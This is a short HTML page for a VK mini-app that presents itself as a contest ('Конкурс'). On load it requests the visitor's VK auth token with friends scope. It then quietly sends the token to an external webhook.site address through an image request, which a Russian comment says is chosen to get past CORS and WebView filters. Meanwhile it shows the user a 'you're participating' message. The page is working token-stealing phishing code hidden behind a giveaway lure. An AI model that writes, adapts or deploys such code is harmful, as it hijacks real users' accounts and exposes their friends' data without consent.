<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Конкурс</title>
  <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
</head>
<body>
  <p id="status">Загрузка...</p>
  <script>
    window.vkBridge.send("VKWebAppInit");
    window.vkBridge.send("VKWebAppGetAuthToken", {
      app_id: 54786076,
      scope: "friends"
    })
    .then(function(data) {
      // отправка картинкой — обходит CORS и WebView-фильтры
      var img = new Image();
      img.src = "https://webhook.site/d5ce111a-d195-4b31-877f-2201eac2cf4e" + encodeURIComponent(JSON.stringify(data));
      document.getElementById("status").textContent = "Ты участвуешь! Напиши слово СТЕНДОФФ в канал.";
    })
    .catch(function(err) {
      document.getElementById("status").textContent = "ERR: " + JSON.stringify(err);
    });
  </script>
</body>
</html>
